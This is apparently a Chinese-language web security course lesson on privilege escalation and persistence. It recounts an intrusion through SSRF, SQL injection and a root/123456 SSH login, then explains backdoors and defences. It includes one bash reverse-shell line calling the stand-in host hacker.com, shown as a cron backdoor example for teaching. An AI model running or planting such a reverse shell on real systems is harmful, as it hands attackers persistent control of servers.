# 12. 权限提升和持久化：为什么漏洞修复了，黑客仍能自由进出？

大家好，我是何为舟。在前六讲中，我们探讨了多种Web安全漏洞及其防护方法，如XSS、SQL注入、CSRF、SSRF及插件漏洞。此外，我还特别强调了黑客善于通过“蛛丝马迹”推断代码逻辑并发起攻击的能力。掌握了这些知识后，您应该能在实际工作中避免大部分的Web安全问题。

然而，在一次日常审计过程中，我发现了内网存在黑客活动的迹象。经过深入调查，发现黑客是通过某个应用的SSRF漏洞入侵的。更令人困惑的是，该应用早已下线，那么黑客是如何继续访问内网的呢？

## 权限提升：如何通过SSRF获取服务器权限

首先，让我们了解什么是**权限提升**（Privilege Escalation）。当黑客利用漏洞或弱密码获取到其他用户的权限时，他们可以以新身份执行非法操作，从而扩大其控制范围。权限提升分为两种类型：

- **水平提升**：黑客获得同级别用户的权限，虽然权限等级不变，但可访问新的数据。
- **垂直提升**：黑客获得更高权限，例如管理员或ROOT权限，这通常对系统造成更大的威胁。

在本案例中，黑客利用了一个具有回显功能的SSRF漏洞，逐步探测内网，并最终找到了一个存在SQL注入漏洞的服务器。通过SQL注入，黑客得以执行命令并进行SSH扫描，最终以默认用户名“root”和简单密码“123456”获得了内网服务器的ROOT权限。

几乎所有类型的漏洞都可能导致权限提升，主要途径包括：
1. **窃取身份**：如无认证、弱密钥、认证信息泄露等。
2. **利用漏洞获取权限**：包括已知漏洞和未公开的0day漏洞。

## 权限持久化：即使修复漏洞，为何仍有后门？

即便修复了漏洞，如果黑客已经设置了“后门”，他们仍然能够轻易进入系统。“后门”是指黑客在取得高级别权限后留下的隐蔽进程，以便将来无需再次绕过安全措施即可直接访问。

例如，黑客可能会留下如下脚本，每分钟自动运行一次：
```bash
bash -i >& /dev/tcp/hacker.com/8080 0>&1
```
一旦hacker.com的8080端口开放，服务器就会定期发送命令请求给黑客，使其获得持续的控制权。

### 后门的工作原理

后门通常表现为木马、Rootkit或WebShell等形式，其中：
- **木马**：看似正常的应用程序，实则暗藏恶意行为。
- **Rootkit**：隐藏于操作系统内核层，难以被检测和清除。
- **WebShell**：允许远程执行命令的小型脚本文件。

### 如何植入后门

黑客可以通过以下方式将后门植入系统：
- 直接下载并安装后门程序。
- 利用文件上传漏洞上传包含恶意代码的文件。
- 配置定时任务或开机启动项确保后门长期有效。

## 防护策略

针对权限提升与持久化风险，我们可以采取以下措施：
- **最小权限原则**：限制每个用户或进程只能访问必需的资源。
- **入侵检测系统 (IDS)**：监控网络流量和主机活动，识别异常模式。

希望以上内容能帮助您更好地理解权限提升与持久化的概念及其防御方法。如果您有任何疑问或想法，请随时留言讨论！

---

最后，作为思考题，请设想自己是一名黑客，拥有普通用户权限的情况下，您可以尝试哪些操作？这些行动又会对企业安全产生怎样的影响呢？期待您的见解！